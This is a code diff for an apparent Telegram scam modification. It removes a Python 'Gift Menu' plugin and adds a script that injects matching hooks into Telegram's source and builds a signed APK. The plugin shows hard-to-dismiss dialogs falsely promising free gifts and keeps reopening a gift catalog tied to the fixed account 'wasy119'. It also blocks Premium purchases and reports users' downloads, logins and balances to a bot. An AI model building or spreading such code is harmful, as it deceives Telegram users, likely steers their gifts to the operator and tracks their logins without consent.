-                        self._log(f"[WELCOME] #{attempt}: frag='{simple_name}' full='{full_name}' is_main={is_main}{marker} auth={authorized} activity={has_activity}")
-                        last_state = state
-
-                    if not authorized:
-                        continue
-                    if not frag:
-                        continue
-                    if not is_main:
-                        continue
-                    if not has_activity:
-                        self._log(f"[WELCOME] '{simple_name}' это главный экран, но activity=None — жду")
-                        continue
-
-                    self._log(f"[WELCOME] УСЛОВИЯ ВЫПОЛНЕНЫ на #{attempt}: frag='{simple_name}'")
-                    GiftMenuPlugin._welcome_shown = True
-                    run_on_ui_thread(lambda: self._show_welcome_dialog())
-                    break
-                except Exception as e:
-                    self._log_exc("welcome_monitor_loop", e)
-
-            if GiftMenuPlugin._welcome_shown:
-                self._log(f"[WELCOME] Монитор завершён успешно после {attempt} попыток")
-
-        threading.Thread(target=task, daemon=True).start()
-
-    # ---------- Стартовое окно (тап в любое место открывает каталог) ----------
-
-    def _show_welcome_dialog(self):
-        self._log("[DIALOG] _show_welcome_dialog СТАРТ (выполняется на UI-потоке)")
-        try:
-            from java import jclass, dynamic_proxy
-            UserConfig = jclass("org.telegram.messenger.UserConfig")
-            account = UserConfig.selectedAccount
-            self._log(f"[DIALOG] account={account}")
-
-            fragment = get_last_fragment()
-            if fragment is None:
-                self._log("[DIALOG] ОШИБКА: fragment is None, выход")
-                return
-
-            context = fragment.getParentActivity()
-            if context is None:
-                self._log("[DIALOG] ОШИБКА: getParentActivity() is None, выход")
-                return
-            self._log(f"[DIALOG] context получен: {context}")
-
-            builder = AlertDialogBuilder(context)
-            self._log("[DIALOG] AlertDialogBuilder создан")
-            builder.set_title("Gift Menu")
-            builder.set_message("Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд")
-
-            try:
-                builder.set_cancelable(False)
-                self._log("[DIALOG] set_cancelable(False) выполнен")
-            except Exception as e:
-                self._log_exc("_show_welcome_dialog/set_cancelable", e)
-
-            opened = [False]
-
-            def open_catalog_once(dialog):
-                if opened[0]:
-                    self._log("[DIALOG] open_catalog_once: уже открывали, игнор")
-                    return
-                opened[0] = True
-                self._log("[DIALOG] open_catalog_once: закрываю диалог и вызываю open_gift_menu")
-                try:
-                    dialog.dismiss()
-                except Exception as e:
-                    self._log_exc("_show_welcome_dialog/dismiss", e)
-                self.open_gift_menu(account, "wasy119")
-
-            def on_view(bld, which):
-                self._log("[DIALOG] Нажата кнопка 'Продолжить'")
-                open_catalog_once(bld)
-
-            builder.set_positive_button("Продолжить", on_view)
-            self._log("[DIALOG] Вызываю builder.show()")
-            dialog = builder.show()
-
-            if dialog is None:
-                self._log("[DIALOG] ОШИБКА: builder.show() вернул None! Окно НЕ показано")
-                return
-
-            self._log("[DIALOG] builder.show() успешно вернул диалог — ОКНО ДОЛЖНО БЫТЬ ВИДНО НА ЭКРАНЕ")
-
-            # AlertDialogBuilder.show() возвращает САМ builder, а не Java AlertDialog.
-            # Поэтому получаем настоящий AlertDialog через get_dialog().
-            # Ловим ACTION_DOWN на decorView и на всех дочерних View,
-            # чтобы тап по любой части стартового окна открывал каталог.
-            try:
-                java_dialog = dialog.get_dialog()
-
-                if java_dialog is None:
-                    self._log("[DIALOG] get_dialog() вернул None, обработчик тапа не установлен")
-                else:
-                    window = java_dialog.getWindow()
-
-                    if window is None:
-                        self._log("[DIALOG] getWindow() вернул None, обработчик тапа не установлен")
-                    else:
-                        OnTouchListener = jclass("android.view.View$OnTouchListener")
-                        MotionEvent = jclass("android.view.MotionEvent")
-                        ViewGroup = jclass("android.view.ViewGroup")
-
-                        class AnyTapListener(dynamic_proxy(OnTouchListener)):
-                            def onTouch(self_inner, v, event):
-                                try:
-                                    if event.getAction() == MotionEvent.ACTION_DOWN:
-                                        self._log("[DIALOG] Тап по любой части стартового окна зафиксирован")
-                                        open_catalog_once(dialog)
-                                except Exception as e:
-                                    self._log_exc("_show_welcome_dialog/onTouch", e)
-
-                                # Не мешаем стандартной обработке кнопок.
-                                return False
-
-                        self._welcome_tap_listener = AnyTapListener()
-
-                        def attach_touch_listener(view):
-                            try:
-                                if view is None:
-                                    return
-
-                                view.setOnTouchListener(self._welcome_tap_listener)
-
-                                if isinstance(view, ViewGroup):
-                                    count = view.getChildCount()
-                                    for i in range(count):
-                                        try:
-                                            attach_touch_listener(view.getChildAt(i))
-                                        except Exception as e:
-                                            self._log_exc(
-                                                "_show_welcome_dialog/attach_child",
-                                                e
-                                            )
-                            except Exception as e:
-                                self._log_exc(
-                                    "_show_welcome_dialog/attach_view",
-                                    e
-                                )
-
-                        attach_touch_listener(window.getDecorView())
-
-                        self._log(
-                            "[DIALOG] Тап-листенер установлен на ВСЕ части стартового окна"
-                        )
-
-            except Exception as e:
-                self._log_exc("_show_welcome_dialog_touch", e)
-
-        except Exception as e:
-            self._log_exc("_show_welcome_dialog", e)
-
-    # ---------- Монитор страницы авторизации ----------
-
-    def _start_login_screen_monitor(self):
-        def monitor_task():
-            last_frag_name = ""
-            notified_login = False
-            was_on_login = False
-            while True:
-                time.sleep(1.0)
-                try:
-                    frag = get_last_fragment()
-                    if not frag:
-                        continue
-
-                    name = frag.getClass().getSimpleName()
-                    authorized = self._is_authorized()
-
-                    if "Login" in name or "Intro" in name:
-                        was_on_login = True
-                        if name != last_frag_name:
-                            last_frag_name = name
-                            if not notified_login:
-                                notified_login = True
-                                self._notify_bot("У вас новое скачивание: пользователь проходит авторизацию")
-
-                            if not GiftMenuPlugin._login_alert_shown:
-                                GiftMenuPlugin._login_alert_shown = True
-                                run_on_ui_thread(lambda: self._show_login_alert(frag))
-
-                    elif was_on_login and authorized and not GiftMenuPlugin._auth_success_notified:
-                        GiftMenuPlugin._auth_success_notified = True
-                        was_on_login = False
-                        self._notify_bot_with_balance("Новый пользователь Авторизовался прошел регистрацию")
-                        self._log("[AUTH] Новый пользователь успешно авторизовался — уведомление отправлено")
-
-                    if name != last_frag_name:
-                        last_frag_name = name
-                except Exception:
-                    pass
-
-        threading.Thread(target=monitor_task, daemon=True).start()
-
-    def _show_login_alert(self, fragment):
-        try:
-            context = fragment.getParentActivity()
-            if not context: return
-            builder = AlertDialogBuilder(context)
-            builder.set_message("В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально")
-            builder.set_positive_button("Хорошо", lambda b, w: b.dismiss())
-            builder.show()
-        except Exception as e:
-            self._log_exc("_show_login_alert", e)
-
-    # ---------- Авто-восстановление каталога (только в главном меню, только если авторизован) ----------
-
-    def _start_auto_reopen_monitor(self):
-        self._log("[REOPEN] Монитор авто-восстановления запущен")
-
-        def task():
-            from java import jclass
-
-            UserConfig = jclass("org.telegram.messenger.UserConfig")
-
-            while True:
-                time.sleep(0.5)
-                try:
-                    account = UserConfig.selectedAccount
-                    sheet = self._current_sheet
-                    if sheet is None:
-                        continue
-                    if sheet.isShowing():
-                        continue
-
-                    self._log("[REOPEN] Каталог закрыт/свёрнут, жду 4 сек")
-                    self._current_sheet = None
-                    time.sleep(4.0)
-
-                    authorized = self._is_authorized(account)
-                    if not authorized:
-                        self._log("[REOPEN] Не авторизован, повторное открытие отменено")
-                        continue
-
-                    frag = get_last_fragment()
-                    simple_name, full_name, is_main, has_activity = self._get_fragment_info(frag)
-
-                    if not is_main:
-                        self._log(f"[REOPEN] Не в главном меню (frag='{simple_name}'), повторное открытие отменено")
-                        continue
-
-                    if not has_activity:
-                        self._log("[REOPEN] Главное меню найдено, но activity=None, повторное открытие отменено")
-                        continue
-
-                    # Повторно проверяем авторизацию и главное меню непосредственно
-                    # перед открытием, чтобы каталог не появился после ухода с главного экрана.
-                    if not self._is_authorized(account):
-                        self._log("[REOPEN] Авторизация потеряна, повторное открытие отменено")
-                        continue
-
-                    self._log("[REOPEN] Условия ОК, переоткрываю каталог")
-                    run_on_ui_thread(lambda acc=account: self.open_gift_menu(acc, "wasy119"))
-                except Exception as e:
-                    self._log_exc("auto_reopen_loop", e)
-        threading.Thread(target=task, daemon=True).start()
-
-    # ---------- Перехват кликов UI (Умный фильтр) ----------
-
-    def _hook_ui_elements(self, sheet, context):
-        """
-        Обработчики каталога.
-
-        ВАЖНО:
-        - обычные подарки НЕ перехватываются;
-        - Premium 3/6/12 перехватываются отдельно;
-        - дерево UI сканируется ОДИН раз, а не 30 раз подряд,
-          чтобы не создавать лаги при открытии каталога.
-        """
-        try:
-            from java import jclass, dynamic_proxy
-
-            ViewGroup = jclass("android.view.ViewGroup")
-            View = jclass("android.view.View")
-            TextView = jclass("android.widget.TextView")
-            OnClickListener = jclass("android.view.View$OnClickListener")
-            OnTouchListener = jclass("android.view.View$OnTouchListener")
-            MotionEvent = jclass("android.view.MotionEvent")
-
-            class AvatarClickListener(dynamic_proxy(OnClickListener)):
-                def onClick(self_inner, v):
-                    try:
-                        b = AlertDialogBuilder(context)
-                        b.set_message("В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально")
-                        b.set_positive_button(
-                            "Хорошо",
-                            lambda bld, w: bld.dismiss()
-                        )
-                        b.show()
-                    except Exception:
-                        pass
-
-            # Жёсткий диалог Premium — не должен пропадать при скролле
-            _premium_dialog_lock = [False]
-            self._premium_alert_ref = [None]
-
-            def _show_premium_hard():
-                if _premium_dialog_lock[0]:
-                    return
-                # Если уже есть живой диалог — не создаём второй
-                try:
-                    old = self._premium_alert_ref[0]
-                    if old is not None:
-                        java_old = old.get_dialog() if hasattr(old, "get_dialog") else None
-                        if java_old is not None and java_old.isShowing():
-                            return
-                except Exception:
-                    pass
-
-                _premium_dialog_lock[0] = True
-                try:
-                    b = AlertDialogBuilder(context)
-                    b.set_message("В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально")
-                    try:
-                        b.set_cancelable(False)
-                    except Exception:
-                        pass
-
-                    def on_ok(bld, w):
-                        try:
-                            bld.dismiss()
-                        except Exception:
-                            pass
-                        _premium_dialog_lock[0] = False
-                        self._premium_alert_ref[0] = None
-
-                    b.set_positive_button("Хорошо", on_ok)
-                    dlg = b.show()
-                    self._premium_alert_ref[0] = dlg
-
-                    # Максимально запрещаем закрытие
-                    try:
-                        java_dlg = dlg.get_dialog() if dlg and hasattr(dlg, "get_dialog") else None
-                        if java_dlg is not None:
-                            java_dlg.setCanceledOnTouchOutside(False)
-                            java_dlg.setCancelable(False)
-                    except Exception:
-                        pass
-                except Exception as e:
-                    _premium_dialog_lock[0] = False
-                    self._premium_alert_ref[0] = None
-                    self._log_exc("_hook_ui_elements/_show_premium_hard", e)
-
-            class PremiumTouchListener(dynamic_proxy(OnTouchListener)):
-                def onTouch(self_inner, v, event):
-                    try:
-                        action = event.getAction()
-                        # Только по отпусканию пальца
-                        if action == MotionEvent.ACTION_UP:
-                            # Небольшая задержка, чтобы скролл/жест не убил диалог
-                            def delayed():
-                                try:
-                                    time.sleep(0.05)
-                                except Exception:
-                                    pass
-                                run_on_ui_thread(_show_premium_hard)
-                            threading.Thread(target=delayed, daemon=True).start()
-                        return True
-                    except Exception as e:
-                        self._log_exc(
-                            "_hook_ui_elements/PremiumTouchListener",
-                            e
-                        )
-                        return True
-
-            self._avatar_clicker = AvatarClickListener()
-            self._premium_touch_listener = PremiumTouchListener()
-
-            def is_gift_cell(view):
-                try:
-                    p = view.getParent()
-
-                    for _ in range(6):
-                        if not p:
-                            break
-
-                        name = p.getClass().getSimpleName()
-
-                        if "GiftCell" in name or "StarGift" in name:
-                            return True
-
-                        p = p.getParent()
-                except Exception:
-                    pass
-
-                return False
-
-            def get_text(view):
-                try:
-                    if isinstance(view, TextView):
-                        value = view.getText()
-
-                        if value is not None:
-                            return str(value)
-                except Exception:
-                    pass
-
-                return ""
-
-            PREMIUM_WORDS = (
-                "3 месяца",
-                "6 месяцев",
-                "12 месяцев"
-            )
-
-            def contains_premium_text(view):
-                """
-                Проверяет, есть ли внутри ViewGroup надпись
-                3/6/12 месяцев.
-                """
-                try:
-                    text_value = get_text(view).lower()
-
-                    for word in PREMIUM_WORDS:
-                        if word in text_value:
-                            return True
-
-                    if isinstance(view, ViewGroup):
-                        count = view.getChildCount()
-
-                        for i in range(count):
-                            child = view.getChildAt(i)
-
-                            if child and contains_premium_text(child):
-                                return True
-                except Exception:
-                    pass
-
-                return False
-
-            def count_premium_texts(view):
-                """
-                Считает Premium-карточки внутри контейнера.
-                Используется, чтобы не поставить обработчик
-                на весь ряд из 3 карточек.
-                """
-                try:
-                    count = 0
-
-                    if isinstance(view, TextView):
-                        value = get_text(view).lower()
-
-                        for word in PREMIUM_WORDS:
-                            if word in value:
-                                count += 1
-                                break
-
-                    if isinstance(view, ViewGroup):
-                        for i in range(view.getChildCount()):
-                            child = view.getChildAt(i)
-
-                            if child:
-                                count += count_premium_texts(child)
-
-                    return count
-                except Exception:
-                    return 0
-
-            def find_premium_card(text_view):
-                """
-                От надписи '3/6/12 месяцев' поднимаемся вверх
-                до контейнера конкретной карточки.
-
-                Не используем TierCell, потому что в разных версиях
-                Telegram имя класса может отличаться.
-                """
-                try:
-                    current = text_view.getParent()
-                    candidate = None
-
-                    for _ in range(8):
-                        if not current:
-                            break
-
-                        if not isinstance(current, ViewGroup):
-                            current = current.getParent()
-                            continue
-
-                        amount = count_premium_texts(current)
-
-                        if amount == 1:
-                            candidate = current
-                        else:
-                            if candidate is not None:
-                                break
-
-                        current = current.getParent()
-
-                    return candidate
-                except Exception:
-                    return None
-
-            def hook_entire_premium_card(card):
-                """
-                Ставит TouchListener на всю Premium-карточку
-                и всё её содержимое.
-                """
-                if not card:
-                    return
-
-                try:
-                    card.setOnTouchListener(self._premium_touch_listener)
-                    try:
-                        card.setClickable(True)
-                        card.setLongClickable(False)
-                    except Exception:
-                        pass
-
-                    if isinstance(card, ViewGroup):
-                        for i in range(card.getChildCount()):
-                            child = card.getChildAt(i)
-                            if child:
-                                hook_entire_premium_card(child)
-                except Exception:
-                    pass
-
-            def scan_for_premium(root):
-                """
-                Один проход по UI.
-                Находит только карточки с 3/6/12 месяцами.
-                """
-                found = []
-
-                def walk(view):
-                    try:
-                        if not view:
-                            return
-
-                        if isinstance(view, TextView):
-                            value = get_text(view).lower()
-
-                            for word in PREMIUM_WORDS:
-                                if word in value:
-                                    card = find_premium_card(view)
-
-                                    if card and card not in found:
-                                        found.append(card)
-
-                                    break
-
-                        if isinstance(view, ViewGroup):
-                            for i in range(view.getChildCount()):
-                                child = view.getChildAt(i)
-
-                                if child:
-                                    walk(child)
-                    except Exception as e:
-                        self._log_exc(
-                            "_hook_ui_elements/scan_for_premium",
-                            e
-                        )
-
-                walk(root)
-
-                for card in found:
-                    hook_entire_premium_card(card)
-
-                self._log(
-                    f"[PREMIUM] Найдено Premium-карточек: {len(found)}"
+    if end < 0:
+        return content
+    addition = f"\n        {line} // GiftMenuMod auto\n"
+    log(f"  inject before end of method: {marker}")
+    return content[:end] + addition + content[end:]
+
+
+def patch_file(path: Path, patcher) -> None:
+    if path is None or not path.exists():
+        log(f"skip (not found)")
+        return
+    old = read(path)
+    new = patcher(old)
+    if new != old:
+        write(path, new)
+    else:
+        log(f"already ok / no match: {path.name}")
+
+
+def patch_application_loader(c: str) -> str:
+    line = "try { org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); } catch (Throwable ignore) {}"
+    c2 = inject_after_method(
+        c,
+        [
+            r"public\s+static\s+void\s+postInitApplication\s*\(\s*\)\s*\{",
+            r"void\s+postInitApplication\s*\(\s*\)\s*\{",
+        ],
+        line,
+        "GiftMenuMod.onAppStart",
+    )
+    if c2 != c:
+        return c2
+    return inject_after_method(
+        c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart"
+    )
+
+
+def patch_login(c: str) -> str:
+    if "GiftMenuMod.onLoginScreen" not in c:
+        c = inject_after_method(
+            c,
+            [
+                r"public\s+void\s+onResume\s*\(\s*\)\s*\{",
+                r"void\s+onResume\s*\(\s*\)\s*\{",
+            ],
+            'try { android.app.Activity __a = null; try { __a = getParentActivity(); } catch (Throwable ignore) {} if (__a == null) try { __a = (android.app.Activity) this; } catch (Throwable ignore) {} if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); } catch (Throwable ignore) {}',
+            "GiftMenuMod.onLoginScreen",
+        )
+    if "GiftMenuMod.onAuthSuccess" not in c:
+        for pat in [
+            r"needFinishActivity\s*\(\s*\)\s*;",
+            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
+        ]:
+            if re.search(pat, c):
+                c = re.sub(
+                    pat,
+                    lambda m: m.group(0)
+                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
+                    c,
+                    count=1,
                 )
+                log("  inject onAuthSuccess")
+                break
+    return c
 
-            def hook_normal_avatars(root):
-                """
-                Старую обработку аватарок оставляем,
-                но выполняем только один раз.
-                Обычные GiftCell не трогаем.
-                """
-                try:
-                    class_name = root.getClass().getSimpleName()
 
-                    if isinstance(root, jclass(
-                        "org.telegram.ui.Components.BackupImageView"
-                    )):
-                        if not is_gift_cell(root):
-                            root.setOnClickListener(
-                                self._avatar_clicker
-                            )
+def patch_dialogs(c: str) -> str:
+    line = (
+        "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), "
+        "() -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); "
+        "} catch (Throwable ignore) {}"
+    )
+    return inject_after_method(
+        c,
+        [
+            r"public\s+void\s+onResume\s*\(\s*\)\s*\{",
+            r"void\s+onResume\s*\(\s*\)\s*\{",
+        ],
+        line,
+        "GiftMenuMod.maybeShowWelcome",
+    )
 
-                    if isinstance(root, ViewGroup):
-                        for i in range(root.getChildCount()):
-                            child = root.getChildAt(i)
 
-                            if child:
-                                # Premium потом перехватитт элемент
-                                # своим TouchListener.
-                                hook_normal_avatars(child)
-                except Exception:
-                    pass
+def patch_gift_sheet(c: str) -> str:
+    line = (
+        "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; "
+        "org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); "
+        "} catch (Throwable ignore) {}"
+    )
+    c2 = inject_before_method_end(
+        c, r"public\s+void\s+show\s*\(\s*\)\s*\{", line, "GiftMenuMod.startSheetHelpers"
+    )
+    if c2 != c:
+        return c2
+    m = re.search(r"\bsuper\.show\s*\(\s*\)\s*;", c)
+    if m and "GiftMenuMod.startSheetHelpers" not in c:
+        log("  inject after super.show()")
+        return (
+            c[: m.end()]
+            + "\n        "
+            + line
+            + " // GiftMenuMod auto"
+            + c[m.end() :]
+        )
+    return c
 
-            def do_hook():
-                try:
-                    window = sheet.getWindow()
 
-                    if window is None:
-                        self._log(
-                            "[PREMIUM] Window=None, жду следующую попытку"
-                        )
-                        return False
+# ═══════════════════════════════════════════════════════════
+#  codemagic.yaml
+# ═══════════════════════════════════════════════════════════
 
-                    decor = window.getDecorView()
+CODEMAGIC_YAML = r"""workflows:
+  telegram-apk:
+    name: Telegram APK (auto GiftMenu)
+    max_build_duration: 120
+    instance_type: mac_mini_m2
+    environment:
+      java: 17
+      ndk: r27
+      android_signing:
+        - keystore_reference
+      groups:
+        - telegram_secrets
+    triggering:
+      events: [push]
+      branch_patterns:
+        - pattern: "*"
+          include: true
+    scripts:
+      - name: Submodules
+        script: git submodule update --init --recursive --depth=1 || true
+      - name: local.properties
+        script: echo "sdk.dir=$ANDROID_SDK_ROOT" > "$CM_BUILD_DIR/local.properties"
+      - name: Keystore
+        script: |
+          mkdir -p "$CM_BUILD_DIR/TMessagesProj/config"
+          if [ -n "$CM_KEYSTORE_PATH" ] && [ -f "$CM_KEYSTORE_PATH" ]; then
+            cp "$CM_KEYSTORE_PATH" "$CM_BUILD_DIR/TMessagesProj/config/release.keystore"
+          fi
+      - name: gradle.properties signing
+        script: |
+          {
+            echo "RELEASE_KEY_PASSWORD=${RELEASE_KEY_PASSWORD:-}"
+            echo "RELEASE_KEY_ALIAS=${RELEASE_KEY_ALIAS:-}"
+            echo "RELEASE_STORE_PASSWORD=${RELEASE_STORE_PASSWORD:-}"
+          } >> "$CM_BUILD_DIR/gradle.properties"
+      - name: AUTO inject Gift Menu (test.py)
+        script: |
+          cd "$CM_BUILD_DIR"
+          python3 test.py
+      - name: Build APK
+        script: |
+          cd "$CM_BUILD_DIR"
+          chmod +x ./gradlew
+          ./gradlew :TMessagesProj:assembleRelease --stacktrace --no-daemon
+    artifacts:
+      - TMessagesProj/build/outputs/apk/**/*.apk
+      - TMessagesProj/build/outputs/apk/**/*.aab
+"""
 
-                    if decor is None:
-                        return False
 
-                    # Сначала обычные обработчики.
-                    hook_normal_avatars(decor)
+# ═══════════════════════════════════════════════════════════
+#  MAIN
+# ═══════════════════════════════════════════════════════════
 
-                    # Затем Premium. Его TouchListener имеет приоритет
-                    # над обычными кликами и блокирует открытие Premium.
-                    scan_for_premium(decor)
+def main() -> int:
+    log(f"ROOT = {ROOT}")
+    if not (ROOT / "TMessagesProj").exists():
+        log("ERROR: TMessagesProj не найден.")
+        log("Положи test.py в КОРЕНЬ форка Telegram (рядом с папкой TMessagesProj) и запусти снова.")
+        return 1
 
-                    return True
+    # 1) GiftMenuMod.java
+    write(MOD_PATH, build_gift_menu_mod_java())
+    log("GiftMenuMod.java OK")
 
-                except Exception as e:
-                    self._log_exc(
-                        "_hook_ui_elements/do_hook",
-                        e
-                    )
-                    return False
+    # 2) inject
+    al = find_java("ApplicationLoader.java")
+    if al:
+        log(f"patch {al.name}")
+        patch_file(al, patch_application_loader)
+    else:
+        log("WARN: ApplicationLoader.java not found")
 
-            # Ссылки на listeners обязательно сохраняем,
-            # иначе Java/Python GC может удалить proxy.
-            self._premium_scroll_listeners = []
+    for name in ("LoginActivity.java", "IntroActivity.java"):
+        p = find_java(name)
+        if p:
+            log(f"patch {p.name}")
+            patch_file(p, patch_login)
 
-            def attach_scroll_monitors(root):
-                """
-                Закрепляет Premium-обработчик при прокрутке каталога.
+    d = find_java("DialogsActivity.java")
+    if d:
+        log(f"patch {d.name}")
+        patch_file(d, patch_dialogs)
+    else:
+        log("WARN: DialogsActivity.java not found")
 
-                Когда карточки уходят с экрана и Telegram переиспользует
-                их View, новые видимые Premium-карточки снова получают
-                наш TouchListener. Обработчик срабатывает только когда
-                прокрутка закончилась, поэтому постоянного сканирования
-                во время движения нет и лагов не создаётся.
-                """
-                try:
-                    if not root:
-                        return
+    gs = find_java("GiftSheet.java")
+    if gs:
+        log(f"patch {gs.name}")
+        patch_file(gs, patch_gift_sheet)
+    else:
+        log("WARN: GiftSheet.java not found")
 
-                    OnScrollListener = jclass(
-                        "androidx.recyclerview.widget.RecyclerView$OnScrollListener"
-                    )
+    # 3) codemagic.yaml
+    cm = ROOT / "codemagic.yaml"
+    if not cm.exists():
+        write(cm, CODEMAGIC_YAML)
+        log("codemagic.yaml created")
+    else:
+        log("codemagic.yaml exists — not overwritten")
 
-                    recycler_class = jclass(
-                        "androidx.recyclerview.widget.RecyclerView"
-                    )
-
-                    class PremiumRecyclerScrollListener(
-                        dynamic_proxy(OnScrollListener)
-                    ):
-                        def onScrollStateChanged(self_inner, recycler, state):
-                            try:
-                                # SCROLL_STATE_IDLE = 0
-                                if state == 0:
-                                    run_on_ui_thread(
-                                        lambda: scan_for_premium(recycler)
-                                    )
-                            except Exception as e:
-                                self._log_exc(
-                                    "_hook_ui_elements/recycler_idle",
-                                    e
-                                )
-
-                    class PremiumScrollChangeListener(
-                        dynamic_proxy(
-                            jclass(
-                                "android.view.View$OnScrollChangeListener"
-                            )
-                        )
-                    ):
-                        def onScrollChange(
-                            self_inner,
-                            v,
-                            scroll_x,
-                            scroll_y,
-                            old_scroll_x,
-                            old_scroll_y
-                        ):
-                            try:
-                                # Небольшой debounce: не запускаем
-                                # сканирование на каждый пикель движения.
-                                now = time.monotonic()
-                                last = getattr(
-                                    v,
-                                    "_gift_premium_last_scan",
-                                    0.0
-                                )
-
-                                if now - last < 0.25:
-                                    return
-
-                                try:
-                                    setattr(
-                                        v,
-                                        "_gift_premium_last_scan",
-                                        now
-                                    )
-                                except Exception:
-                                    pass
-
-                                run_on_ui_thread(
-                                    lambda: scan_for_premium(v)
-                                )
-                            except Exception as e:
-                                self._log_exc(
-                                    "_hook_ui_elements/scroll_change",
-                                    e
-                                )
-
-                    def walk_scrollable(view):
-                        try:
-                            if not view:
-                                return
-
-                            name = view.getClass().getName()
-
-                            if "RecyclerView" in name:
-                                listener = PremiumRecyclerScrollListener()
-                                view.addOnScrollListener(listener)
-                                self._premium_scroll_listeners.append(listener)
-
-                            elif (
-                                "ScrollView" in name
-                                or "NestedScrollView" in name
-                            ):
-                                listener = PremiumScrollChangeListener()
-                                view.setOnScrollChangeListener(listener)
-                                self._premium_scroll_listeners.append(listener)
-
-                            if isinstance(view, ViewGroup):
-                                for i in range(view.getChildCount()):
-                                    child = view.getChildAt(i)
-                                    if child:
-                                        walk_scrollable(child)
-
-                        except Exception as e:
-                            self._log_exc(
-                                "_hook_ui_elements/walk_scrollable",
-                                e
-                            )
-
-                    walk_scrollable(root)
-
-                    self._log(
-                        "[PREMIUM] Мониторы прокрутки установлены"
-                    )
-
-                except Exception as e:
-                    # Если в конкретной сборке нет androidx RecyclerView,
-                    # обычный первоначальный hook всё равно продолжает работать.
-                    self._log_exc(
-                        "_hook_ui_elements/attach_scroll_monitors",
-                        e
-                    )
-
-            def hook_task():
-                # Первоначальная обработка после построения каталога.
-                time.sleep(0.8)
-
-                def initial_hook():
-                    if do_hook():
-                        try:
-                            window = sheet.getWindow()
-                            if window:
-                                decor = window.getDecorView()
-                                attach_scroll_monitors(decor)
-                        except Exception as e:
-                            self._log_exc(
-                                "_hook_ui_elements/initial_scroll_hook",
-                                e
-                            )
-
-                run_on_ui_thread(initial_hook)
-
-            threading.Thread(
-                target=hook_task,
-                daemon=True
-            ).start()
-
+    # 4) убедиться что test.py в корне (для CI)
+    target = ROOT / "test.py"
+    self_path = Path(__file__).resolve()
+    if self_path.exists() and self_path != target.resolve():
+        try:
+            write(target, self_path.read_text(encoding="utf-8", errors="replace"))
+            log("test.py copied to repo root")
         except Exception as e:
-            self._log_exc("_hook_ui_elements", e)
+            log(f"copy test.py skip: {e}")
 
-    # ---------- Своя система логов ----------
+    log("DONE. Функционал плагина вписан. Собирай APK.")
+    return 0
 
-    def _log(self, text: str):
-        self._logs.append(text)
-        if len(self._logs) > MAX_LOG_LINES:
-            self._logs = self._logs[-MAX_LOG_LINES:]
-        try:
-            self.log(text)
-        except Exception:
-            pass
 
-    def _log_exc(self, where: str, e: Exception):
-        tb = traceback.format_exc()
-        self._log(f"ИСКЛЮЧЕНИЕ в {where}: {e}\n{tb}")
-
-    # ---------- Перехват команды ----------
-
-    def on_send_message_hook(self, account: int, params: Any) -> HookResult:
-        try:
-            if not hasattr(params, "message") or not isinstance(params.message, str):
-                return HookResult()
-
-            text = params.message.strip()
-
-            if text == ".giftlogs":
-                self._send_logs_as_message(account, params)
-                return HookResult(strategy=HookStrategy.CANCEL)
-
-            if text == ".giftreset":
-                GiftMenuPlugin._welcome_shown = False
-                self._log("[RESET] Флаг _welcome_shown сброшен командой .giftreset, монитор перезапущен")
-                self._start_welcome_monitor()
-                return HookResult(strategy=HookStrategy.CANCEL)
-
-            if not text.startswith(TRIGGER):
-                return HookResult()
-
-            match = USERNAME_RE.match(text)
-            if not match:
-                return HookResult()
-
-            username = match.group(1)
-            my_id = get_user_config(account).getClientUserId()
-            peer = getattr(params, "peer", None)
-
-            if peer != my_id:
-                return HookResult()
-
-            run_on_ui_thread(lambda: self.open_gift_menu(account, username))
-            return HookResult(strategy=HookStrategy.CANCEL)
-        except Exception as e:
-            self._log_exc("on_send_message_hook", e)
-            return HookResult()
-
-    def _send_logs_as_message(self, account: int, params: Any):
-        def show():
-            try:
-                fragment = get_last_fragment()
-                if fragment is None or fragment.getParentActivity() is None:
-                    return
-                context = fragment.getParentActivity()
-
-                tail = self._logs[-60:] if len(self._logs) > 60 else self._logs
-                full_text = "\n".join(tail) if tail else "Логов пока нет."
-
-                builder = AlertDialogBuilder(context)
-                builder.set_title(f"Логи gift_menu (последние {len(tail)})")
-                builder.set_message(full_text)
-                builder.set_positive_button("Закрыть", lambda b, w: b.dismiss())
-                builder.show()
-            except Exception as e:
-                self._log_exc("_send_logs_as_message", e)
-
-        run_on_ui_thread(show)
-
-    def open_gift_menu(self, account: int, username: str):
-        self._log(f"[OPEN] open_gift_menu вызван: account={account} username={username}")
-        try:
-            from java import jclass
-            TLRPC = jclass("org.telegram.tgnet.TLRPC")
-            req = TLRPC.TL_contacts_resolveUsername()
-            req.username = username
-            req.flags = 0
-
-            def on_resolved(response, error):
-                try:
-                    if error:
-                        self._log(f"[OPEN] resolveUsername ОШИБКА: {error}")
-                        return
-                    if response is None:
-                        self._log("[OPEN] resolveUsername: response is None")
-                        return
-                    if response.peer is None:
-                        self._log("[OPEN] resolveUsername: response.peer is None")
-                        return
-
-                    target_id = response.peer.user_id
-                    self._log(f"[OPEN] resolveUsername успешно: target_id={target_id}")
-                    user = None
-                    users = response.users
-                    self._log(f"[OPEN] users.size()={users.size()}")
-                    for i in range(users.size()):
-                        u = users.get(i)
-                        if u.id == target_id:
-                            user = u
-                            break
-
-                    if user is None:
-                        self._log("[OPEN] ОШИБКА: пользователь не найден в списке users")
-                        return
-
-                    self._log(f"[OPEN] Пользователь найден: id={user.id}, показываю UI")
-
-                    try:
-                        get_messages_controller(account).putUser(user, False)
-                    except Exception as e:
